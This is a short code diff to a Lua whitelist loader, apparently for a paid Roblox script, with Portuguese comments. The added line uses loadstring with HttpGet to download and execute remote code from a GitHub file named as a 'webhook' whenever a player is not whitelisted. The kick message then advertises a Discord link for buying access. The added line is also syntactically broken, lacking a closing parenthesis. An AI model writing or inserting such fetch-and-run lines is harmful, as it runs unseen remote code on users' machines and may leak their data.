@@ -23,6 +23,7 @@ local function loadScript()
         print("Loader: Access granted to player: " .. playerName)
     else
         -- Se o jogador não estiver na whitelist, ele será kickado
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/WinteryXD/wyvern-x/main/not-authorized-webhook.txt")
         game.Players.LocalPlayer:Kick("You are not whitelisted, buy your access here: discord.gg/puFUffYa7M")
     end
 end
